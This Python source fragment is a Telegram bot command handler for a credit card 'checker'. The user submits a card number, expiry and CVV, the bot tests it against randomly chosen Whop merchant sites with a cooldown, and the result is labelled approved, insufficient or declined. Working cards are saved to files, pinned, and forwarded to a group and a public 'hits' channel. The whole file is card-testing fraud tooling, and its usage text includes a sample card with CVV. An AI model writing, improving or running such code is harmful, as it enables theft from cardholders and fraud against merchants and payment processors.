@router.message(Command("old_sh_whop_removed"))
async def _old_cmd_sh_removed(message: types.Message):
    """Old Whop /sh handler — removed. /sh is now Shopify single check.
    Replaced the legacy Shopify checker. Now uses the 8-API Whop pool
    with automatic failover and 16-slot global concurrency.
    """
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    # Free for everyone — no auth.has_premium_access check anymore.

    # ── Antispam cooldown ─────────────────────────────────────────────────
    remaining = whop_check_cooldown(user_id)
    if remaining > 0:
        await message.reply(
            f"{wpe('warn')} {_to_bi('Slow down!')} "
            f"{_to_bi(f'Please wait {remaining:.0f}s before next check.')}"
        )
        return

    # ── Extract CC ────────────────────────────────────────────────────────
    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)
    if not cc_str:
        await message.reply(
            f"{wpe('warn')} {_to_bi('No CC found!')}\n\n"
            f"{wpe('arrow_right')} {_to_bi('Usage:')} /sh 4388540109154632|03|2030|815\n"
            f"{wpe('arrow_right')} {_to_bi('Or reply to a message containing a CC.')}"
        )
        return

    # ── Pick a random Whop site (url, biz_id) ─────────────────────────────
    site_pair = get_random_whop_site()
    if not site_pair:
        await message.reply(
            f"{wpe('warn')} {_to_bi('No Whop sites available!')}\n\n"
            f"{wpe('warn')} {_to_bi('Add lines like:')}"
            f"\n{_to_bi('https://whop.com/foo/bar/ - biz_XXXXXX')}"
            f"\n{_to_bi('to sites.txt — the biz_id is sent to the API (URL-only lines also work: the API discovers it)')}"
        )
        return
    site_url, biz_id = site_pair




    # ── Set antispam cooldown ─────────────────────────────────────────────
    whop_set_cooldown(user_id)

    # ── Send loading message FIRST (instant feedback) ────────────────────
    site_label = site_url.split("//")[1][:30] if "://" in site_url else site_url[:30]
    loading_msg = await message.reply(
        f"{wpe('arc_reactor')} {_to_bi('Checking CC with Whop...')}\n\n"
        f"{wpe('card')} {_to_bi('CC:')} <code>{cc_str}</code>\n"
        f"{wpe('site')} {_to_bi('Site:')} {_to_bi('Whop')}\n"
        f"{wpe('neon_ring')} {_to_bi('Processing')}... {wpe('processing')}"
    )

    # ── Run Whop check + BIN lookup in parallel ──────────────────────────
    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]
    _chk = asyncio.create_task(whop_check_card(cc_str, site_url, biz_id,
                                                user_id=user_id,
                                                priority=True))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {
            "status": "ERROR",
            "card": cc_str,
            "card_brand": "-",
            "price": "-",
            "elapsed": 0.0,
            "response": str(e)[:120],
            "site": site_url,
            "biz_id": biz_id,
            "is_charged": False,
            "is_insufficient": False,
            "is_dead": True,
        }
    bin_info = await _bin

    # ── Format result ─────────────────────────────────────────────────────
    is_charged = result.get("is_charged", False)
    is_insufficient = result.get("is_insufficient", False)
    is_dead = result.get("is_dead", False)
    price = str(result.get("price", "-"))
    elapsed = float(result.get("elapsed", 0.0) or 0.0)
    status = str(result.get("status", "UNKNOWN"))
    resp_msg = str(result.get("response", ""))
    card_brand = str(result.get("card_brand", "-"))

    if is_charged:
        status_line = (
            f"{wpe('approved')} {_to_bi('APPROVED')} {wpe('approved')}"
        )
    elif is_insufficient:
        status_line = (
            f"{wpe('insufficient')} {_to_bi('INSUFFICIENT')} {wpe('insufficient')}"
        )
    elif is_dead:
        status_line = f"{wpe('skull')} {_to_bi('DECLINED')}"
    else:
        status_line = f"{wpe('warn')} {_to_bi(status[:60])}"

    # Truncate long response messages for display
    resp_disp = resp_msg[:120] if resp_msg else "-"
    site_disp = site_url if site_url else "-"

    result_text = (
        f"{status_line}\n\n"
        f"{wpe('card')} {_to_bi('CC:')} <code>{cc_str}</code>\n"
        f"{wpe('site')} {_to_bi('Site:')} {_to_bi('Whop')}\n"
        f"{wpe('amount')} {_to_bi('Price:')} {_to_bi(f'${price}')}\n"
        f"{wpe('time')} {_to_bi('Time:')} {_to_bi(f'{elapsed:.2f}s')}\n"
        f"{wpe('gem')} {_to_bi('Response:')} {_to_bi(resp_disp)}\n\n"
        f"{wpe('triple_ring')} {_to_bi('BIN Info:')}\n"
        f"{brand_emoji(bin_info.get('brand', '-'))}{_to_bi('Brand:')} {_to_bi(bin_info.get('brand', '-'))}\n"
        f"{wpe('arrow_right')} {_to_bi('Type:')} {_to_bi(bin_info.get('type', '-'))}\n"
        f"{wpe('arrow_right')} {_to_bi('Bank:')} {_to_bi(bin_info.get('bank', '-'))}\n"
        f"{wpe('arrow_right')} {_to_bi('Country:')} {bin_info.get('flag', '')} {_to_bi(bin_info.get('country', '-'))}\n\n"
        f"{wpe('checked_by')} {_to_bi('Checked by:')} {user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}\n"
        f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
    )

    await safe_edit(loading_msg, result_text)

    # ── Save charged CC ──────────────────────────────────────────────────
    if is_charged:
        try:
            auth.save_charged_cc(cc_str, user_id,
                                  (message.from_user.full_name or "Unknown"),
                                  "Whop", str(price))
        except Exception:
            pass

    # ── Append to hit_sites.txt ──────────────────────────────────────────
    try:
        _hit_label = "Approved" if is_charged else (
            "Insufficient" if is_insufficient else ("Declined" if is_dead else None)
        )
        log.info("[/whop-sh] cc=%s site=%s price=%s status=%r -> hit_label=%r",
                 cc_str.split("|")[0], site_url, price, status, _hit_label)
        await _log_check_debug("sh", cc_str, site_url, result, _hit_label)
        if _hit_label:
            await _save_hit_site(site_url, price, _hit_label)
    except Exception as _e:
        log.warning("/sh hit logging failed: %s", _e)

    # ── Pin if approved ──────────────────────────────────────────────────
    if is_charged:
        try:
            await bot.pin_chat_message(message.chat.id, loading_msg.message_id,
                                       disable_notification=True)
        except Exception:
            pass
        try:
            await _send_charged_group(user_id, result_text)
        except Exception:
            pass

    # ── Forward APPROVED hits to the public Whop hits channel ────────────
    # (only approved — insufficient is logged to checked.txt but NOT sent to channel)
    if is_charged:
        await _send_whop_hit_channel(
            is_approved=is_charged,
            is_insufficient=False,
            price=price,
            elapsed=elapsed,
            user_id=user_id,
            user_name=message.from_user.full_name or "",
            user_uname=message.from_user.username or "",
        )

    # ── Save to checked.txt (approved + insufficient) ────────────────────
    if is_charged or is_insufficient:
        await _save_to_checked_txt(
            card=cc_str,
            status="APPROVED" if is_charged else "INSUFFICIENT",
            response=resp_msg,
            price=price,
            user_id=user_id,
            user_name=message.from_user.full_name or "",
            user_uname=message.from_user.username or "",
            site="Whop",
            elapsed=elapsed,
            card_brand=card_brand,
        )


